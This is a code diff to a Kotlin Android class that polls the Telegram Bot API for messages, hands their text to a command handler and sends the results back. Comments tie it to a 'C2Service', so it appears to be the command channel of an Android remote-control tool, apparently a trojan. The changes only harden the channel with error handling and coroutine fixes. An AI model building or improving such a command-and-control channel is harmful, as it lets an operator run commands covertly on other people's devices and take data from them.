@@ -6,7 +6,6 @@ import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.withContext
 import okhttp3.OkHttpClient
 import okhttp3.Request
-import okhttp3.Response
 import org.json.JSONArray
 import org.json.JSONObject
 import java.util.concurrent.TimeUnit
@@ -17,8 +16,12 @@ import java.util.concurrent.TimeUnit
  * المسؤوليات:
  * 1. استدعاء getUpdates بشكل دوري لقراءة الرسائل الجديدة.
  * 2. تحويل نص الرسالة إلى أمر مفهوم عبر CommandHandler.
- * 3. إرسال الردود عبر TelegramReporter (يُمرر كـ callback).
+ * 3. إرسال الردود عبر TelegramReporter.
  * 4. تتبع offset لتجنب قراءة نفس الرسالة مرتين.
+ *
+ * ✅ إصلاح: parseAndDispatch() و dispatchCommand() أصبحتا suspend
+ * لأن TelegramReporter.sendMessage() هي suspend. هذا يمنع خطأ
+ * "Suspend function should be called only from a coroutine".
  *
  * ملاحظات:
  * - Long Polling: نستخدم timeout=30 في getUpdates لتقليل عدد الطلبات.
@@ -50,7 +53,7 @@ class TelegramController(
     // آخر update_id تمت معالجته (لتجنب التكرار)
     private var lastUpdateId: Long = 0L
 
-    // معالج الأوامر (يُمرر من C2Service عبر setter أو في constructor)
+    // معالج الأوامر (يُمرر من C2Service عبر attach)
     private var commandHandler: CommandHandler? = null
 
     // مرسل الردود (يُمرر من C2Service)
@@ -87,12 +90,17 @@ class TelegramController(
         val request = Request.Builder().url(url).get().build()
 
         val body: String = withContext(Dispatchers.IO) {
-            httpClient.newCall(request).execute().use { response ->
-                if (!response.isSuccessful) {
-                    Log.e(TAG, "getUpdates HTTP ${response.code}")
-                    return@withContext ""
+            try {
+                httpClient.newCall(request).execute().use { response ->
+                    if (!response.isSuccessful) {
+                        Log.e(TAG, "getUpdates HTTP ${response.code}")
+                        return@withContext ""
+                    }
+                    response.body?.string() ?: ""
                 }
-                response.body?.string() ?: ""
+            } catch (e: Exception) {
+                Log.e(TAG, "getUpdates network error: ${e.message}", e)
+                ""
             }
         }
 
@@ -103,8 +111,9 @@ class TelegramController(
 
     /**
      * تحليل استجابة getUpdates وتوزيع الرسائل على CommandHandler.
+     * ✅ suspend لأن dispatchCommand() تستدعي reporter.sendMessage() (suspend).
      */
-    private fun parseAndDispatch(body: String) {
+    private suspend fun parseAndDispatch(body: String) {
         try {
             val root = JSONObject(body)
             if (!root.optBoolean("ok", false)) {
@@ -143,8 +152,9 @@ class TelegramController(
     /**
      * تمرير الأمر إلى CommandHandler، مع التقاط أي استثناء
      * حتى لا تتوقف حلقة الـ polling.
+     * ✅ suspend لأن reporter.sendMessage() هي suspend.
      */
-    private fun dispatchCommand(text: String) {
+    private suspend fun dispatchCommand(text: String) {
         val handler = commandHandler ?: run {
             Log.w(TAG, "CommandHandler not attached")
             return
@@ -153,7 +163,11 @@ class TelegramController(
             handler.handle(text, reporter)
         } catch (e: Exception) {
             Log.e(TAG, "command execution error: ${e.message}", e)
-            reporter?.sendMessage("⚠️ خطأ في تنفيذ الأمر: ${e.message}")
+            try {
+                reporter?.sendMessage("⚠️ خطأ في تنفيذ الأمر: ${e.message}")
+            } catch (inner: Exception) {
+                Log.e(TAG, "failed to send error message: ${inner.message}", inner)
+            }
         }
     }
 
@@ -161,6 +175,10 @@ class TelegramController(
      * إرسال رسالة نصية بسيطة (اختصار للاستخدام الداخلي).
      */
     suspend fun sendSimple(text: String) {
-        reporter?.sendMessage(text)
+        try {
+            reporter?.sendMessage(text)
+        } catch (e: Exception) {
+            Log.e(TAG, "sendSimple error: ${e.message}", e)
+        }
     }
 }
